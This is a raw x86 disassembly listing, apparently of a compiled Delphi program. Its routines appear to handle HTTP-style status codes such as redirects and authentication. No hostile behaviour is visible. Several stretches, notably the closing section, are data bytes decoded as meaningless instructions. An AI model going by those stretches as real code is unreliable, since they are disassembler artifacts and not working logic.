xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489b7e
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404e68
retn
sub_489b94
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_485a80
mov [ edi + 0xa8 ] esi
mov [ edi + 0xb8 ] 0x0
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_489bdc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_403f34
mov esi edi
mov [ ebx + 0x4 ] esi
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_489b94
mov [ ebx + 0xc ] eax
mov ecx [ ebx + 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4898bc
mov [ ebx + 0x10 ] eax
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_489c48
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
lea edx [ esi + 0xc ]
mov eax [ r-xdata ]
call sub_462560
lea edx [ esi + 0x10 ]
mov eax [ r-xdata ]
call sub_462560
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403f54
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_489c88
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_489e30
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ eax ]
call [ edx + 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x12c ]
call sub_486480
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8c ]
call sub_478edc
xor eax eax
push ebp
push sub_489df2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0xc ]
push [ ebx + 0xb0 ]
push r-xdata
push [ ebx + 0xac ]
push r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
movzx eax [ esi + 0x114 ]
push [ eax * 4 + rw-data ]
lea eax [ ebp - 0x8 ]
mov edx 0x5
call sub_4051e4
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x8c ]
mov ecx [ eax ]
call [ ecx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
sub esi 0x1
jno r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_487e5c
test esi esi
jl r-xdata
call sub_403e34
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8c ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8c ]
mov edx [ eax ]
call [ edx + 0xb8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
inc esi
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489e37
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_404e68
retn
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x8 ]
mov edx ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8c ]
mov ecx [ eax ]
call [ ecx + 0x88 ]
lea ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x8 ]
mov edx ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
call sub_405120
test eax eax
jle r-xdata
sub_489e5c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_489f49
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8c ]
call sub_477d64
xor edx edx
push ebp
push j_sub_404570#8
push [ fs : edx ]
mov [ fs : edx ] esp
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
test esi esi
jg r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489f50
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8c ]
call sub_477d64
add ebx 0x1
jno r-xdata
cmp esi ebx
jg r-xdata
call sub_403e34
sub_489f23
call sub_404854
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489f50
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_489f58
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov ecx edx
add ecx ecx
inc ecx
test ecx ecx
js r-xdata
mov eax esp
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_48a09a
push [ fs : eax ]
mov [ fs : eax ] esp
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_419b64
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ eax + 0x90 ]
mov [ ebp - 0x10 ] edx
mov edx [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x90 ] edx
xor ecx ecx
push ebp
push sub_48a07d
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebp + 0x8 ]
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_488244
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_489ad4
mov ebx eax
cmp [ ebp - 0x8 ] 0xffffffff
jle r-xdata
shr ecx 0x2
lea edx [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_489758
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_487c24
call sub_4047d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x90 ] edx
lea edx [ ebp - 0xc ]
mov eax [ r-xdata ]
call sub_462560
retn
mov eax [ ebp - 0x8 ]
test eax eax
jl r-xdata
mov ebx [ eax + ecx * 4 ]
dec ecx
push ebx
jns r-xdata
inc eax
xor edx edx
call sub_403e2c
cmp edx [ ebp - 0x8 ]
jle r-xdata
mov ecx [ ebp - 0x4 ]
movsx ecx [ ecx + edx * 2 ]
cmp ebx ecx
jne r-xdata
inc edx
dec eax
jne r-xdata
call sub_404884
jmp r-xdata
test edx edx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48a0a1
lea eax [ ebp - 0x14 ]
call sub_404e44
retn
sub_48a0a8
push ebp
mov ebp esp
add esp 0xfffffff8
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_419b64
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ eax + 0x90 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x90 ] edx
xor edx edx
push ebp
push sub_48a12b
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp + 0x8 ]
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_488244
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48a132
lea edx [ ebp - 0x4 ]
mov eax [ r-xdata ]
call sub_462560
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x90 ] edx
retn
sub_48a138
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
movzx eax [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
lea edx [ ebp - 0x1 ]
push edx
mov edx [ ebp + 0x8 ]
mov ebx eax
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x10 ]
mov ecx [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
sub_48a184
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] ebx
mov ebx ecx
add ebx ebx
inc ebx
test ebx ebx
js r-xdata
mov edx esp
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_48a582
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
call sub_48a138
pop ecx
test al al
jne r-xdata
shr ebx 0x2
xor ebx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_489ad4
mov ecx 0x64
cdq
idiv ecx
mov esi eax
cmp esi 0x3
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov [ eax + 0x8c ] 0x0
mov [ ebp - 0x15 ] 0x1
jmp r-xdata
mov esi [ edx + ebx * 4 ]
dec ebx
push esi
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_489ad4
cmp eax 0x130
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48a589
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_404e68
retn
cmp esi 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
add [ eax + 0x118 ] 0x1
jno r-xdata
test bl bl
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_489ad4
sub eax 0x191
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x10 ]
mov edx [ edx + 0x6c ]
call sub_404edc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x120 ] 0x0
je r-xdata
call sub_403e34
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_489ad4
cmp eax 0xcc
je r-xdata
push ebp
call sub_48a0a8
pop ecx
mov [ ebp - 0x15 ] 0x4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
mov eax [ ebx + 0xf0 ]
cmp eax [ ebx + 0x104 ]
jge r-xdata
sub eax 0x6
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov edx [ edx + 0xb0 ]
call sub_404edc
mov [ ebp - 0x15 ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
mov eax [ ebx + 0x118 ]
push eax
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xa8 ]
test al al
jne r-xdata
mov edx [ eax + 0x118 ]
cmp edx [ eax + 0x11c ]
jge r-xdata
mov [ ebp - 0x15 ] 0x1
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_488244
mov [ ebp - 0x15 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xa0 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
mov eax [ ebx + 0xf4 ]
cmp eax [ ebx + 0x104 ]
jge r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
add eax 0x6c
mov edx [ ebp - 0x8 ]
call sub_404e98
push ebp
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x14 ]
call sub_489f58
pop ecx
mov [ ebp - 0x15 ] 0x1
jmp r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov edx [ edx + 0xb0 ]
call sub_404edc
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
mov eax [ ebx + 0x118 ]
push eax
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xa8 ]
test al al
je r-xdata
push ebp
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x14 ]
call sub_489f58
pop ecx
mov [ ebp - 0x15 ] 0x1
jmp r-xdata
mov edx [ eax ]
call [ edx + 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test [ eax + 0x121 ] 0x1
setne bl
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x12c ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xa4 ]
test al al
jne r-xdata
push ebp
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x14 ]
call sub_489f58
pop ecx
mov [ ebp - 0x15 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8c ]
mov edx [ eax + 0xb8 ]
mov [ ebp - 0x1c ] edx
xor edx edx
push ebp
push sub_48a414
push [ fs : edx ]
mov [ fs : edx ] esp
mov [ eax + 0xb8 ] 0xfa0
xor eax eax
push ebp
push sub_48a3e7
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
call sub_48a0a8
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push ebp
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x14 ]
call sub_489f58
pop ecx
mov [ ebp - 0x15 ] 0x1
jmp r-xdata
mov [ ebp - 0x15 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
add eax 0xac
mov edx [ ebp - 0x8 ]
call sub_404e98
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_489ad4
cmp eax 0x12e
je r-xdata
push ebp
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x14 ]
call sub_489f58
pop ecx
mov [ ebp - 0x15 ] 0x1
jmp r-xdata
mov edx [ eax ]
call [ edx + 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test [ eax + 0x121 ] 0x1
setne bl
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8c ]
mov edx [ ebp - 0x1c ]
mov [ eax + 0xb8 ] edx
retn
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0xc ]
xor eax eax
mov [ ebx + 0xb4 ] eax
lea eax [ ebx + 0xb0 ]
mov edx r-xdata
call sub_404e98
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_489ad4
cmp eax 0x12f
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x5c ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
add eax 0xb0
mov edx [ ebp - 0xc ]
call sub_404e98
jmp r-xdata
sub_48a59f
inc [ ebx ]
add [ eax ] al
add [ edi + 0x45 ] al
push esp
add [ ebx + 0x56 ] dl
mov ebx eax
mov eax ebx
call sub_479ef8
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47ff04
mov [ ebx + 0x124 ] eax
xor eax eax
mov [ ebx + 0xf0 ] eax
xor eax eax
mov [ ebx + 0xf4 ] eax
mov dl 0x1
mov eax ebx
call sub_488fa0
mov [ ebx + 0x100 ] 0x0
movzx eax [ r-xdata ]
mov [ ebx + 0x121 ] al
mov [ ebx + 0x11c ] 0xf
mov [ ebx + 0x120 ] 0x0
mov [ ebx + 0x114 ] 0x1
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_489bdc
mov [ ebx + 0x128 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_486384
mov esi eax
mov [ ebx + 0x12c ] esi
mov eax esi
call sub_48645c
mov [ ebx + 0x104 ] 0x3
mov [ ebx + 0x108 ] 0xff
pop esi
pop ebx
retn
sub_48a655
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
add esi esi
inc esi
test esi esi
js r-xdata
mov [ ebp + 0xc ] esp
mov [ ebp - 0x4 ] ecx
mov esi edx
mov [ ebp - 0x8 ] eax
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_405314
xor eax eax
push ebp
push sub_48a966
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0x118 ] edx
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xf0 ] edx
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xf4 ] edx
test ebx ebx
je r-xdata
shr esi 0x2
xor eax eax
mov [ ebp - 0xc ] eax
mov eax ebx
call sub_4192c0
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov edi [ ebx + esi * 4 ]
dec esi
push edi
jns r-xdata
mov eax [ ebp - 0x8 ]
call sub_489778
push eax
mov eax [ ebp - 0x8 ]
call sub_489784
mov edx eax
mov eax [ ebp - 0x8 ]
pop ecx
call sub_488a84
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x124 ]
call sub_4804d0
mov edx [ ebp - 0x10 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
call sub_403e2c
mov eax [ ebp - 0x8 ]
call sub_489778
add eax 0x88
push eax
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8c ]
call sub_477d64
mov edx [ ebp - 0x14 ]
pop eax
call sub_404e98
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x108 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x128 ]
call sub_489e5c
mov eax [ ebp - 0x8 ]
call sub_489778
push eax
mov eax [ ebp - 0x8 ]
call sub_489784
mov edx eax
mov eax [ ebp - 0x8 ]
pop ecx
call sub_488fa8
mov eax [ ebp - 0x8 ]
call sub_489778
call sub_489ad4
cmp eax 0x64
je r-xdata
mov edx edi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x128 ]
mov ecx [ ebp + 0x8 ]
call sub_48a184
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov eax [ ebp - 0x8 ]
call sub_489784
add eax 0xac
mov edx [ ebp - 0x4 ]
call sub_404e98
mov eax [ ebp - 0x8 ]
call sub_489784
add eax 0xb0
mov edx esi
call sub_404e98
mov eax [ ebp - 0x8 ]
call sub_489784
mov edx [ ebp + 0x14 ]
mov [ eax + 0xb4 ] edx
mov eax [ ebp - 0x8 ]
call sub_489778
mov [ eax + 0x90 ] ebx
xor eax eax
push ebp
push sub_48a93c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_489784
mov edx eax
mov eax [ ebp - 0x8 ]
call sub_488574
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x8c ]
mov eax esi
mov edx [ rw-data ]
call sub_4040f0
test al al
je r-xdata
jmp [ eax * 4 + jump_table_48a83d ]
mov eax [ ebp - 0x8 ]
call sub_489784
add eax 0xac
mov edx [ ebp - 0x4 ]
call sub_404e98
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_489778
mov edx eax
mov eax [ ebp - 0x8 ]
call sub_488244
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48a943
mov eax [ ebp - 0x8 ]
call sub_489778
call sub_4898fc
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xf0 ] edx
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xf4 ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
cdq
push edx
push eax
mov eax ebx
call sub_4192e0
mov eax [ ebp - 0xc ]
cdq
push edx
push eax
mov eax ebx
call sub_419344
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xf0 ] edx
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xf4 ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
cdq
push edx
push eax
mov eax ebx
call sub_4192e0
mov eax [ ebp - 0xc ]
cdq
push edx
push eax
mov eax ebx
call sub_419344
retn
mov eax [ ebp - 0x8 ]
call sub_47fde0
sub_48a858
inc [ 0xac ]
mov eax [ ebp - 0x8 ]
call sub_489784
mov edx eax
mov eax [ ebp - 0x8 ]
call sub_488574
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x8c ]
mov eax esi
mov edx [ rw-data ]
call sub_4040f0
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_489778
push eax
mov eax [ ebp - 0x8 ]
call sub_489784
mov edx eax
mov eax [ ebp - 0x8 ]
pop ecx
call sub_488a84
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x124 ]
call sub_4804d0
mov edx [ ebp - 0x10 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax [ ebp - 0x8 ]
call sub_489778
add eax 0x88
push eax
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8c ]
call sub_477d64
mov edx [ ebp - 0x14 ]
pop eax
call sub_404e98
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x108 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x128 ]
call sub_489e5c
mov eax [ ebp - 0x8 ]
call sub_489778
push eax
mov eax [ ebp - 0x8 ]
call sub_489784
mov edx eax
mov eax [ ebp - 0x8 ]
pop ecx
call sub_488fa8
mov eax [ ebp - 0x8 ]
call sub_489778
call sub_489ad4
cmp eax 0x64
je r-xdata
mov edx edi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x128 ]
mov ecx [ ebp + 0x8 ]
call sub_48a184
and eax 0x7f
cmp eax 0x4
ja r-xdata
jmp [ eax * 4 + jump_table_48a83d ]
mov edx [ ebp - 0x4 ]
call sub_404e98
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_489784
add eax 0xac
mov eax [ ebp - 0x8 ]
call sub_489778
mov edx eax
mov eax [ ebp - 0x8 ]
call sub_488244
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48a943
mov eax [ ebp - 0x8 ]
call sub_489778
call sub_4898fc
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xf0 ] edx
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xf4 ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
cdq
push edx
push eax
mov eax ebx
call sub_4192e0
mov eax [ ebp - 0xc ]
cdq
push edx
push eax
mov eax ebx
call sub_419344
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xf0 ] edx
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xf4 ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
cdq
push edx
push eax
mov eax ebx
call sub_4192e0
mov eax [ ebp - 0xc ]
cdq
push edx
push eax
mov eax ebx
call sub_419344
retn
mov eax [ ebp - 0x8 ]
call sub_47fde0
sub_48a97c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_48a9b8
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48a9bf
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_405af0
sub_48a9e0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0xaa
dec eax
add [ eax ] bl
add [ eax ] al
add [ eax - 0x53ffbddd ] ch
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax - 0x17ffb754 ] bh
lodsb [ esi ]
dec eax
add [ ecx ] cl
push esp
dec edx
push eax
inc ebp
inc edi
inc esp
popad
je r-xdata
add [ ebp + esi * 4 - 0x4a43ffb8 ] bl
dec eax
add [ eax - 0x45 ] ah
dec eax
add ah dh
mov ebx 0xbb8c0048
dec eax
add [ eax + 0x5d ] al
inc edx
add [ eax ] ah
mov esp 0xbce80048
dec eax
add [ eax - 0xfffb742 ] ch
mov esi 0x5e4c0048
inc edx
add [ eax - 0x41 ] cl
dec eax
add [ eax - 0x13ffb741 ] dl
lodsb [ esi ]
dec eax
add [ eax + 0x5d ] cl
inc edx
add ah dl
pop ebp
inc edx
add [ esp + edi * 4 + 0x48 ] bh
add [ eax + 0x5c0048be ] al
mov esp 0xbe540048
dec eax
add [ eax ] dh
pop esi
inc edx
add [ edx ] cl
push esp
dec edx
push eax
inc ebp
inc edi
dec ecx
insd
popad
nop
cld
stosb [ edi ]
dec eax
add [ edi ] al
or dl [ edx + ecx * 2 + 0x50 ]
inc ebp
